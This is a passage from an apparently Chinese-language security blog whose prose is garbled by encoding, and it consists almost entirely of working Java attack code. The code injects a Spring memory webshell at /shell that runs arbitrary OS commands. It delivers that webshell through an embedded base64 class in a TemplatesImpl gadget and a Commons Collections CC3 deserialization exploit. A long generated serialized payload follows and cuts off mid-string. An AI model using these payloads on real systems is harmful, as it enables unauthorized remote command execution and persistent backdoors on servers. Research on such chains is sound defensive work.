p;<br>                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br><br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(p.start().getInputStream())).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next() : o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯TemplatesImplæ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ControllerBehind</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//åŠ è½½magicControllerç±»çš„å­—èŠ‚ç </span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQAhQoAIQBBCABCCwBDAEQLAEUARggARwgASAoASQBKCgAMAEsIAEwKAAwATQcATgcATwgAUAgAUQoACwBSCABTCABUBwBVCgALAFYKAFcAWAoAEgBZCABaCgASAFsKABIAXAoAEgBdCgASAF4KAF8AYAoAXwBhCgBfAF4LAEUAYgcAYwcAZAcAZQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA7TG9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcjsBAAR0ZXN0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcATwcAZgcATgcAVQcAYwEAEE1ldGhvZFBhcmFtZXRlcnMBAApTb3VyY2VGaWxlAQATVGVzdENvbnRyb2xsZXIuamF2YQwAIgAjAQAEY29kZQcAZwwAaABpBwBqDABrAGwBAAABAAdvcy5uYW1lBwBtDABuAGkMAG8AcAEAA3dpbgwAcQByAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAIgBzAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAHQAdQcAdgwAdwB4DAAiAHkBAAJcQQwAegB7DAB8AH0MAH4AcAwAfwAjBwBmDACAAIEMAIIAIwwAgwCEAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOW9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcgEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhACAAIQAAAAAAAgABACIAIwABACQAAAAvAAEAAQAAAAUqtwABsQAAAAIAJQAAAAYAAQAAAA0AJgAAAAwAAQAAAAUAJwAoAAAAAQApACoAAgAkAAABqAAGAAgAAACzKxICuQADAgBOLLkABAEAOgQtxgCTEgU6BRIGuAAHtgAIEgm2AAqZACG7AAtZBr0ADFkDEg1TWQQSDlNZBS1TtwAPOganAB67AAtZBr0ADFkDEhBTWQQSEVNZBS1TtwAPOga7ABJZGQa2ABO2ABS3ABUSFrYAFzoHGQe2ABiZAAsZB7YAGacABRkFOgUZB7YAGhkEGQW2ABsZBLYAHBkEtgAdpwAMLBEBlLkAHgIApwAETrEAAQAAAK4AsQAfAAMAJQAAAEoAEgAAABAACQARABEAEgAVABMAGQAVACkAFgBHABgAYgAbAHgAHACMAB0AkQAeAJgAHwCdACAAogAhAKUAIgCuACYAsQAkALIAJwAmAAAAXAAJAEQAAwArACwABgAZAIkALQAuAAUAYgBAACsALAAGAHgAKgAvADAABwAJAKUAMQAuAAMAEQCdADIAMwAEAAAAswAnACgAAAAAALMANAA1AAEAAACzADYANwACADgAAAApAAj+AEcHADkHADoHADn8ABoHADv8ACUHADxBBwA5+AAa+QAIQgcAPQAAPgAAAAkCADQAAAA2AAAAAQA/AAAAAgBA&quot;</span>;<br>            <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>            m.setAccessible(<span class="hljs-literal">true</span>);<br>            Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>            Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br>            System.out.println(<span class="hljs-string">&quot;Instance created: &quot;</span> + instance);<br>            <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>            <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-comment">//        Method mm = (Class.forName(&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;).getDeclaredMethods())[0];</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">mm</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethods()[<span class="hljs-number">0</span>];<br>            rs.registerMapping(info, instance, mm);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶å®æŠŠå‰é¢çš„æ‹¿æ¥å¤ç”¨ä¸€ä¸‹å°±å¯ä»¥äº†ï¼Œåªä¸è¿‡è¿™é‡Œå†æŠŠæµç¨‹å®Œæ•´è®°å½•ä¸€ä¸‹</p><p>ç„¶åæœ¬åœ°åŠ äº†ä¸€ä¸ªccä¾èµ–ï¼Œç”¨cc3æ¥æ‰“å…¥å†…å­˜é©¬è¿›è¡Œæµ‹è¯•</p><p>cc3expï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Chain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//åˆ©ç”¨åå°„è®¾ç½®éœ€è¦æ»¡è¶³çš„å€¼</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;ControllerBehind.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-comment">//è¿™é‡Œçš„èµ‹å€¼åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±ä¸éœ€è¦äº†</span><br><span class="hljs-comment">//        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span><br><span class="hljs-comment">//        Transformer transformer = templates.newTransformer();</span><br>        <span class="hljs-comment">//ç»“åˆå‰é¢çš„é“¾å­ä¸²è”èµ·æ¥ï¼Œéšä¾¿ä¸€ä¸ªéƒ½è¡Œ</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotation</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(Class.class, Map.class);<br>        annotation.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotation.newInstance(Override.class,lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotation.newInstance(Override.class, proxyMap);<br>        System.out.println(serialize(o));<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        oos.writeObject(obj);<br>        oos.close();<br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(bytes);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆçš„base64å­—ç¬¦ä¸²</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAJzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABhMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAfc8r+ur4AAAA0AMgKAC4AYwgAZAcAZQoAAwBjCgADAGYHAGcIAGgHAGkHAGoHAEgJAGsAbAoACABtCgBuAG8KAHAAcQoAcAByBwBzCAB0CgBrAHUKAG4AdgoACAB3CgB4AHkJAHoAewcAfAoAFwBjCAB9CgAXAH4KABcAfwoAFwCACgCBAIIKAIMAhAgAhQsAhgCHBwCIBwCJCACKCgAiAIsHAIwKACUAjQcAjgsAIQCPCgAIAJAKACcAkQcAkgoAKwCTBwCUBwCVAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMY29tL2Nsb3duL0NvbnRyb2xsZXJCZWhpbmQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAJYBABBNZXRob2RQYXJhbWV0ZXJzAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEABGNvZGUBABJMamF2YS9sYW5nL1N0cmluZzsBAAFkAQACW0IBAAFtAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQALY29uc3RydWN0b3IBAB9MamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAIaW5zdGFuY2UBABJMamF2YS9sYW5nL09iamVjdDsBAAdjb250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAA3VybAEASExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uOwEABGluZm8BAD9Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAAJycwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEAAm1tAQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEAIkxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjwqPjsBAA1TdGFja01hcFRhYmxlBwCSAQAKU291cmNlRmlsZQEAFUNvbnRyb2xsZXJCZWhpbmQuamF2YQwALwAwAQsweXY2NnZnQUFBRFFBaFFvQUlRQkJDQUJDQ3dCREFFUUxBRVVBUmdnQVJ3Z0FTQW9BU1FCS0NnQU1BRXNJQUV3S0FBd0FUUWNBVGdjQVR3Z0FVQWdBVVFvQUN3QlNDQUJUQ0FCVUJ3QlZDZ0FMQUZZS0FGY0FXQW9BRWdCWkNBQmFDZ0FTQUZzS0FCSUFYQW9BRWdCZENnQVNBRjRLQUY4QVlBb0FYd0JoQ2dCZkFGNExBRVVBWWdjQVl3Y0FaQWNBWlFFQUJqeHBibWwwUGdFQUF5Z3BWZ0VBQkVOdlpHVUJBQTlNYVc1bFRuVnRZbVZ5VkdGaWJHVUJBQkpNYjJOaGJGWmhjbWxoWW14bFZHRmliR1VCQUFSMGFHbHpBUUE3VEc5eVp5OWpiRzkzYmk5emNISnBibWRpYjI5MGJXVnRiM0o1YzJobGJHd3ZZMjl1ZEc5eWJHeGxjaTlVWlhOMFEyOXVkSEp2Ykd4bGNqc0JBQVIwWlhOMEFRQlNLRXhxWVhaaGVDOXpaWEoyYkdWMEwyaDBkSEF2U0hSMGNGTmxjblpzWlhSU1pYRjFaWE4wTzB4cVlYWmhlQzl6WlhKMmJHVjBMMmgwZEhBdlNIUjBjRk5sY25ac1pYUlNaWE53YjI1elpUc3BWZ0VBQVhBQkFCcE1hbUYyWVM5c1lXNW5MMUJ5YjJObGMzTkNkV2xzWkdWeU93RUFBVzhCQUJKTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzQkFBRmpBUUFUVEdwaGRtRXZkWFJwYkM5VFkyRnVibVZ5T3dFQUJHRnlaekFCQUFaM2NtbDBaWElCQUJWTWFtRjJZUzlwYnk5UWNtbHVkRmR5YVhSbGNqc0JBQWR5WlhGMVpYTjBBUUFuVEdwaGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjWFZsYzNRN0FRQUljbVZ6Y0c5dWMyVUJBQ2hNYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnpjRzl1YzJVN0FRQU5VM1JoWTJ0TllYQlVZV0pzWlFjQVR3Y0FaZ2NBVGdjQVZRY0FZd0VBRUUxbGRHaHZaRkJoY21GdFpYUmxjbk1CQUFwVGIzVnlZMlZHYVd4bEFRQVRWR1Z6ZEVOdmJuUnliMnhzWlhJdWFtRjJZUXdBSWdBakFRQUVZMjlrWlFjQVp3d0FhQUJwQndCcURBQnJBR3dCQUFBQkFBZHZjeTV1WVcxbEJ3QnREQUJ1QUdrTUFHOEFjQUVBQTNkcGJnd0FjUUJ5QVFBWWFtRjJZUzlzWVc1bkwxQnliMk5sYzNOQ2RXbHNaR1Z5QVFBUWFtRjJZUzlzWVc1bkwxTjBjbWx1WndFQUIyTnRaQzVsZUdVQkFBSXZZd3dBSWdCekFRQUhMMkpwYmk5emFBRUFBaTFqQVFBUmFtRjJZUzkxZEdsc0wxTmpZVzV1WlhJTUFIUUFkUWNBZGd3QWR3QjREQUFpQUhrQkFBSmNRUXdBZWdCN0RBQjhBSDBNQUg0QWNBd0Fmd0FqQndCbURBQ0FBSUVNQUlJQUl3d0